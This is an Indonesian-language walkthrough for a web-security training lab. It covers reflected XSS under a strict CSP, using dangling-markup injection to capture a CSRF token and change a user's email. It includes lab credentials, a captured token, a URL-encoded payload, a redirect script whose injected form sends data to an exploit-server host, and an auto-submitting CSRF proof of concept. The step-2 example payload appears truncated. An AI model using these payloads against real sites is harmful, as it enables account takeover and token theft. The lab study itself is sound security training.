### Penjelasan Solusi untuk Lab: Reflected XSS dengan CSP Ketat dan Dangling Markup Attack

Lab ini memerlukan Anda untuk mengeksploitasi kerentanan **Reflected XSS** yang dibatasi oleh **Content Security Policy (CSP)**. Serangan bertujuan untuk:  
1. Mencuri token **CSRF** pengguna.  
2. Menggunakan token untuk mengubah email pengguna menjadi `hacker@evil-user.net`.  

---

### **Langkah-langkah Penyelesaian**

#### **1. Masuk ke Akun yang Disediakan**
- Masuk ke akun dengan kredensial:  
  - **Username:** `wiener`  
  - **Password:** `peter`  

#### **2. Identifikasi Kerentanan XSS**
- Pergi ke fungsi "Change Email".  
- Coba masukkan payload XSS di parameter email, misalnya:  
  ```html
  test
  ```
- Periksa apakah kode Anda terefleksi di halaman. Jika berhasil, Anda dapat mengeksploitasi celah ini.

---

#### **3. 
![image](https://github.com/user-attachments/assets/680d5788-671f-4970-8822-ab22e449e3c2)

---
mendapatkan csrf :
![image](https://github.com/user-attachments/assets/1fadda7e-b9f9-423f-832e-e5b918304aaf)

csrf:NHXdJ7n8Nwhi4Rcyeqe1Ttp1t3VdkC3c





payload:
https://0a1a00c40438878c80b4c774000a0011.web-security-academy.net/my-account?id=wiener&email=egi%22%3E%3C/form%3E%3Cform%20class=%22login_form%22%20name=%22myform%22%20action=%22https://%20exploit-0ac600cd0401876680dcc619015b0066.exploit-server.net/exploit%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3EClick%3C/button%3E

<script>
    location = 'https://0a65000704eb47a3818f987200ab0033.web-security-academy.net/my-account?email="></form>
    <form class="login_form" name="myform" action="https://exploit-0a32008204ab475d810397ff012e0075.exploit-server.net/exploit" method="GET">
        <button class="button" type="submit">Click</button>
    </form>';
</script>


<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1a00c40438878c80b4c774000a0011.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net" />
      <input type="hidden" name="csrf" value="NHXdJ7n8Nwhi4Rcyeqe1Ttp1t3VdkC3c" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>




